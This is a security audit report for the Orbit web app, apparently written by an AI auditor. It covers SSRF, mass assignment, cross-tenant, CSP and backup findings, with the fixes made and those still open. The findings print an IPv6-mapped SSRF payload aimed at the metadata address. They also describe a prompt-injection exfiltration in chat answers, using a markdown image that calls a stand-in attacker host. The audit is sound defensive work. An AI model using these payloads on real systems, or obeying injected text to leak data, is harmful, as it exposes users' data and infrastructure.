# Orbit security & reliability audit

**Date:** 2026-09-26 · **Base commit:** `9caf5ef` · **Branch with fixes:** `claude/festive-gauss-zpk1yv` · **Auditor:** Claude

**Summary.** The foundations were already strong. Tenancy is enforced server-side almost everywhere. Webhooks verify signatures. Internal routes fail closed. Tokens are hashed, and secrets are encrypted at rest. The audit still found real, exploitable gaps, and every P0 and most P1 items are fixed on this branch:

- **P0:** a Next.js release with two critical and several high advisories (including a Proxy bypass), and an SSRF guard that IPv6-mapped addresses walked straight past.
- **P1:** three user-controlled fetches that skipped the SSRF guard entirely, mass assignment that let a caller re-home rows into another account, and cross-tenant id references in events, opportunities and reminders.

This is defence in depth, not a guarantee. The items marked **Open** below still need a decision or a dashboard change.

Labels: **Fixed** means it was changed on this branch and a test pins it. **Open** means it is not changed, and the fix is given. **Dashboard** means it can only be checked or fixed in a Vercel, Neon, Clerk or GitHub setting.

---

## 1. Method

1. **Mapped the architecture and attack surface.** This covered the Next 16 App Router, the Clerk middleware (`src/proxy.ts`) and the `PUBLIC_ROUTES` bypass list. It covered the 66 route handlers, the 52 `"use server"` modules (about 300 exports, each one a public POST endpoint), the API-key/MCP/extension/internal-cron auth planes, and the Neon HTTP driver.
2. **Ran four independent adversarial passes, in parallel:**
   - server-action IDOR and mass assignment, traced export by export into `src/lib`;
   - route handlers, webhooks, MCP OAuth and token routes;
   - injection, SSRF, XSS, redirects and uploads;
   - infrastructure, secrets, CI/CD, reliability and dependencies.

   I re-read each reported finding at the cited lines before acting on it. Several were independently reported by two or three passes.
3. **Ran the tooling:**
   - `npm audit`;
   - a secret scan of the tree and of the full 2,093-commit history (via a temporary full clone, because the local checkout is shallow);
   - typecheck, lint, production build and the full smoke suite (section 5).

---

## 2. Fixed on this branch

| # | Sev | Pri | Issue | Commit |
|---|-----|-----|-------|--------|
| 1 | Critical | P0 | next 16.2.10: RCE in Image Optimizer (GHSA-2xp9-vwfh-vxw4), Proxy bypass (GHSA-6gpp-xcg3-4w24), Server Action DoS, rewrite SSRF, cache confusion; sharp/libvips and postcss advisories | `bd12554` |
| 2 | High | P0 | SSRF guard bypass via IPv6-mapped/NAT64/6to4/compatible addresses | `9c17277` |
| 3 | High | P1 | ICS subscription fetch: no SSRF guard, `http:` allowed, redirects followed, no timeout, no body cap, status oracle | `efb9279` |
| 4 | High | P1 | Contact-photo download: no SSRF guard, redirects followed, internal images copied to public Blob | `efb9279` |
| 5 | Medium | P1 | Mass assignment in `updateEvent` / `updateCampaign` (can set `userId`) | `46a3891` |
| 6 | Medium | P1 | Cross-tenant `eventId`: attendee/company imports and enrichment (public cover overwrite) | `46a3891` |
| 7 | Medium | P1 | Cross-tenant `contactId`: opportunities and reminders leak another account's contact name/employer via job matcher and ICS feed | `46a3891` |
| 8 | Medium | P1 | Chat markdown renders remote images, so prompt injection can exfiltrate data with no click | `4be7621` |
| 9 | Medium | P1 | Suspended or stealth-held accounts keep access via extension; stealth-held via MCP OAuth/API keys | `4be7621` |
| 10 | Medium | P2 | `/api/csp-report`: unauthenticated, unbounded `error_events` writes | `4be7621` |
| 11 | Medium | P2 | No per-user webhook endpoint cap, so one account can stall the shared delivery drain | `4be7621` |
| 12 | Medium | P2 | scrypt key derivation (~40 ms CPU) on every encrypt/decrypt | `4be7621` |
| 13 | Medium | P2 | No timeouts on Google/Microsoft token and Graph calls | `4be7621` |
| 14 | Low | P2 | Credentials in URLs (calendar/scan/MCP tokens, `?token=`, OAuth `code`/`state`) sent to Sentry | `4be7621` |
| 15 | Low | P2 | Avatar data URLs served as `image/svg+xml` from app origin; look-alike Blob host passes `includes()` | `efb9279` |
| 16 | Low | P2 | MCP connector (URL) keys accepted by the REST API | `ec224bf` |
| 17 | Low | P2 | No Dependabot / dependency update mechanism | `4be7621` |
| 18 | Low | P3 | Ops workflow job timeout shorter than its own step budget | `ec224bf` |

### Details

**1. Vulnerable Next.js (Critical, P0).**
- **What:** `next@16.2.10` is inside the ranges of GHSA-2xp9-vwfh-vxw4 (unauthenticated RCE in the Image Optimization API, and `next/image` is used) and GHSA-6gpp-xcg3-4w24 (Proxy bypass, where `src/proxy.ts` is the auth front door). It is also inside the ranges of highs for Server Action DoS and rewrite SSRF.
- **Fix:**
  - Upgraded `next` and `eslint-config-next` to 16.3.6. This also brings sharp 0.35.4 and postcss 8.5.23.
  - Bumped fast-uri, ip-address, qs, hono, nanoid, browserslist and baseline-browser-mapping in place, within their existing ranges.
  - Removed `experimental.viewTransition`. It is no longer a valid key in 16.3, where view transitions are on by default, and it failed the build's type check.
  - Did not run `npm audit fix`, because it also moves `@clerk/ui` from 1.25 to 1.36, which is an unreviewed auth-UI change.
- **Residual:** 14 moderate/high advisories, all under `@clerk/ui` → `@solana/wallet-adapter` → react-native/metro. That is build tooling for an optional Web3 sign-in, not reachable at runtime, and has no fix short of a downgrade. They are accepted until Clerk updates the dependency.

**2. SSRF guard bypass (High, P0).**
- **What:** `src/lib/net-guard.ts`. The WHATWG URL parser rewrites `https://[::ffff:169.254.169.254]/` to the host `[::ffff:a9fe:a9fe]`. `isBlockedAddress` only matched the dotted form, so webhook endpoints and event URLs could target the metadata range and loopback. NAT64 (`64:ff9b::/96`), IPv4-compatible, 6to4 and Teredo forms also got through.
- **Fix:** IPv6 literals are now parsed into 16-bit groups. Every IPv4-embedding form is re-checked against the IPv4 rules. Multicast, site-local, discard, 198.18/15 and 192.0.0/24 are also blocked. Tests pin the hex forms the parser actually produces.

**3. ICS feed SSRF (High, P1).**
- **What:** `calendar-sync.ts` used plain `fetch(..., { redirect: "follow" })` on a user-supplied URL. It accepted `http:`, and ran on save and then on every scheduled sync with nobody watching. The error message echoed the upstream status, which turns it into a port and path oracle for internal hosts. An unbounded `res.text()` let one tarpit feed stall the shared sync cron.
- **Fix:** it now goes through `guardedFetchText`, which re-runs the guard on every redirect hop, with a 20 s timeout and a 10 MB cap (`onOverflow: "error"`). `http://` and `webcal://` links are upgraded to https, including rows saved before this change.

**4. Contact-photo SSRF (High, P1).**
- **What:** `downloadImageBytes` fetched the extension's `photoUrl`, `profileImageUrl`, or a Microlink `og:image` with `redirect: "follow"` and no guard. Any `image/*` response was copied to public Blob storage, which means internal image endpoints could be read in full. The Microlink target was passed through whenever the string merely contained `linkedin.com/in/`.
- **Fix:**
  - Added a new `guardedFetch` to `net-guard.ts` that re-checks every hop, and a `readBodyCapped` that stops streaming at the cap.
  - The Microlink target is always rebuilt as `https://www.linkedin.com/in/<slug>`.
  - Event covers now share the same helpers. They were already guarded, but they buffered the whole body before checking its size.

**5. Mass assignment (Medium, P1).**
- **What:** `updateEvent` and `updateCampaign` spread the client object into Drizzle `.set()`, which writes any key that names a real column. Passing `userId` moved the caller's event or campaign into another account, where it could carry a phishing link or a tracking cover image.
- **Fix:**
  - Both now use explicit, type-checked allowlists.
  - `updateEventForUser` strips `id`, `userId` and `createdAt` at runtime.
  - The campaign UPDATE is now also scoped by `userId`.
  - Sequence length is capped at 20.

**6–7. Cross-tenant references (Medium, P1).**
- **Events:** `upsertEventAttendees`, `upsertEventCompanies` and `enrichEvent` now call `assertEventOwnedBy` (checks the id is a UUID and that the caller owns the event) before any write. Before this, `ON CONFLICT (event_id, …)` filled in blank fields on the victim's own attendee rows, and enrichment overwrote the victim's public cover at `event-covers/<eventId>`.
- **Contacts:** `insertOpportunities`, `updateReminder`, `confirmSuggestedReminder` and bulk-capture commitments now check that the contact belongs to the caller. The two read joins that leaked data (job matcher, ICS feed) also require the contact's owner to match.
- **Test:** `smoke-cross-tenant-refs` covers each case. It fails on the old code.

**8. Image exfiltration from chat (Medium, P1).**
- **What:** chat answers are model output over text Orbit didn't write: imported mail, scraped pages, transcripts. A prompt-injected `![](https://attacker/?d=…)` was fetched by the browser as soon as the answer rendered, and `img-src https:` allows that.
- **Fix:** `<ReactMarkdown disallowedElements={["img"]}>`. Answers have no legitimate use for remote images.

**9. Account gates (Medium, P1).**
- **What:** `requireExtensionUserId` skipped the suspension and stealth checks. `assertAccountUsable`, which covers API keys and MCP OAuth, skipped the stealth check.
- **Fix:** both now apply the same gates as `requireUserId`.

**10. CSP report amplification (Medium, P2).**
- **What:** the throttle key contained the full blocked URI, which is attacker-controlled, so every invented URI wrote a new row.
- **Fix:**
  - The blocked URI is reduced to its origin or a keyword.
  - The directive's shape is checked.
  - Rows are capped at 100 per instance per hour.

**11. Webhook endpoint cap (Medium, P2).**
- **Fix:**
  - At most 10 endpoints per account, enforced in both the REST route and the server action.
  - The action now validates the URL and event types with the REST zod schema.
- **Still open:** make the drain fair across users (see §3).

**12–18. Smaller fixes:**
- The scrypt key is cached per secret value.
- Google, Microsoft and Graph calls get 10–30 s timeouts.
- `src/lib/sentry-scrub.ts` is wired into `beforeSend`, `beforeSendTransaction` and `beforeBreadcrumb` on the server, edge and client.
- Avatar data URLs are limited to raster types, and SVG sniffing is hardened.
- Blob-host checks parse the hostname.
- `mcp_url` keys are refused outside the MCP surface.
- Added `.github/dependabot.yml`.
- `ops.yml` timeout raised from 5 to 8 minutes.

---

## 3. Open: recommended next

| Sev | Pri | Issue | Exact fix |
|-----|-----|-------|-----------|
| Medium | P1 | **Backups never restore-tested; Blob not backed up; `ENCRYPTION_SECRET` not escrowed** (RUNBOOK drill log: "not yet run"). A restored dump cannot decrypt OAuth tokens or BYOK keys without the secret. | Run the restore drill now and log it. Add a monthly workflow that restores the latest artifact into a throwaway Neon branch and checks row counts. Store `ENCRYPTION_SECRET` next to the age private key. State RPO (24 h) and RTO in the runbook. Decide whether losing Blob (avatars, capture photos) is acceptable, or add an export job. |
| Medium | P1 | **CSP is report-only, and `script-src` has `'unsafe-inline'`**, so it gives little XSS protection. | Dashboard: set `CSP_ENFORCE=1` in Vercel production once `csp.report` rows are quiet. Then move the authenticated app routes to a nonce plus `'strict-dynamic'` (marketing pages can stay static). Add `Cross-Origin-Opener-Policy: same-origin-allow-popups`, which keeps the Clerk and Google popups working. |
| Low | P1 | **MCP OAuth ignores token scopes.** Every valid Clerk OAuth token gets read and write (`src/lib/mcp/oauth.ts:122`), so a dynamically registered client that asked only for `openid email` gets full CRM access. | Define an `orbit:mcp` scope in Clerk. Require `result.scopes?.includes("orbit:mcp")`, and map read vs. write from the scopes. Needs a Clerk dashboard change, so it was not done here. |
| Medium | P2 | **Webhook drain is not fair across tenants.** Deliveries run one at a time, oldest first, across all users. | Pick rows with `ROW_NUMBER() OVER (PARTITION BY user_id)` and a per-user limit per run. Deliver with small bounded concurrency, and shorten the timeout for endpoints that keep failing. |
| Medium | P2 | **The global 32 MB server-action body limit applies to every action**, and many text fields have no limit (chat question, reminder text, rawNotes, recruiter drafts). `listSuggestedReminders`, `listImports` and `listRecentMerges` accept an unbounded `limit`. | Add per-field caps as `clipInput` already does, and clamp every `limit`. Longer term, move capture uploads to a route handler and set the action limit back to 1–2 MB. |
| Low | P2 | **`/api/track` rate limit** is keyed on IP plus User-Agent, so changing the UA resets it. The `dwell` and `load` kinds skip it, and it is held in memory per instance. | Key on IP (or a /24 bucket) and apply it before the `kind` branches. |
| Low | P2 | **Least-privilege database roles.** The runtime role owns the schema (`reconcileSchema` can DROP), and the backup workflow uses that same URL. | Use a DML-only runtime role and a migrator URL used only in `scripts/migrate.ts`. Use a `pg_read_all_data` role (`BACKUP_DATABASE_URL`) for backups. Pass `fetchOptions: { signal: AbortSignal.timeout(25_000) }` to `neon()`. |
| Low | P2 | **Recruiter pool gate:** `logRecruiter({ recruiterId })` links any recruiter row, skipping the "pooled and sharing" rule. After a downgrade, `loadRecruitersForChat` and `updateCalendarSubscription` / `syncDueCalendarSubscriptions` skip the plan gate. | Require the recruiter to be pooled and the viewer to be sharing (or an existing link). Use `requireRecruitersUser` and `requireSyncUser` respectively. |
| Low | P3 | **Expand/contract is not enforced.** The DDL has `DROP COLUMN`s, which the runbook calls additive, and `migrate.ts` runs merges and backfills on every production build. | Add a smoke check that rejects a new `DROP` / `DELETE` / `ALTER … TYPE` unless it is allowlisted with a version note. Move the merges into a job that can be triggered on its own. |
| Low | P3 | **Ops workflow concurrency:** one `ops` group with `cancel-in-progress: false` keeps only one pending run, so a long hourly run can cause a queued 10-minute sweep to be dropped. | Split the long jobs into their own workflow and concurrency group. |
| Low | P3 | GitHub Actions are pinned by tag, not SHA. There are no `tags` unique index and no event-attendee `user_id` conflict guard. | Pin to SHAs (Dependabot will keep them current). Add `UNIQUE (user_id, lower(name))` on tags after deduping. |
| Low | P3 | **DNS-rebinding window** between `assertDeliverable`'s lookup and `fetch`'s own lookup. This is documented as accepted. | To close it fully, use an undici `Agent` whose `connect.lookup` re-checks the resolved IP. |

**Dashboard checks** (not visible from the repo):
- `PRODUCTION_DB_HOST` is set, so preview builds cannot migrate production.
- Neon `statement_timeout` is non-zero. `/api/health?token=…` reports it.
- Backup secrets and the Better Stack heartbeat are configured.
- "Dependabot security updates" is enabled in GitHub → Settings → Code security.

---

## 4. Already done well

- Every route handler and server action derives the user from the session. `smoke-action-user-scope` enforces this with the TypeScript parser. Admin actions 404 to non-admins.
- Internal cron routes fail closed without `CRON_SECRET` and use constant-time comparison.
- Stripe, Clerk (svix) and Resend webhooks verify the raw body and a timestamp, and are idempotent.
- API keys, scan tokens and calendar tokens are 256-bit, stored as SHA-256 hashes, and shape-checked before any query.
- OAuth `state` is bound to the session in an httpOnly cookie. `returnTo` goes through `safeReturnPath`.
- MCP refuses any request with an `Origin` header (no browser-driven or DNS-rebinding abuse), and each request is stateless.
- Security headers: HSTS (2 years, subdomains), `frame-ancestors 'none'`, nosniff, Permissions-Policy, and a minimal policy on the waitlist host.
- CI runs on `pull_request` only, with a read-only token and no secrets. Backups are age-encrypted, run under pipefail, and have a dead-man heartbeat.
- `ENCRYPTION_SECRET` and other required production variables are enforced by `check:env` before the Vercel build.
- **Secret scan:** no live secrets in the tree or in any of the 2,093 commits. Hits were test fixtures only (`u:secret@host`, a base64 "testsecret"). `extension/.env.production` holds only public values.

---

## 5. Verification

Toolchain: Node 24.21 (`.nvmrc`) and npm 11. Local Node 22 / npm 10 cannot `npm ci` this lockfile.

- `npm run typecheck`: clean.
- `npm run lint`: 0 errors, 46 warnings, all present before this branch.
- `npm run build` (Next 16.3.6): succeeds.
- Smoke suite (`--ci`, 394 scripts in 4 parallel shards): **392 passed.** The two that did not:
  - `smoke-constellation-match` tripped its per-frame wall-clock budget (6.5 ms) while four shards and a build shared the CPU. It passes when run alone, and it does not touch any code changed here.
  - `smoke-avatar-storage`: see the environment note below.

  New and updated tests:
  - `smoke-cross-tenant-refs` (new; fails on the old code);
  - `smoke-sentry-scrub` (new);
  - SSRF cases in `smoke-webhook-delivery`, `smoke-event-url-guard` and `smoke-avatar-storage`;
  - `smoke-api-keys` (connector-key scope);
  - `smoke-csp-report` (new bounded contract).
- Known environment limit: the "bogus Blob token" step of `smoke-avatar-storage` hangs in this sandbox on the base commit too, because it makes real network retries through the proxy. It is unrelated to these changes, and CI runs it normally.
- `npm audit --omit=dev`: 0 critical. The remaining advisories are the `@clerk/ui`/Solana chain (§2, item 1).
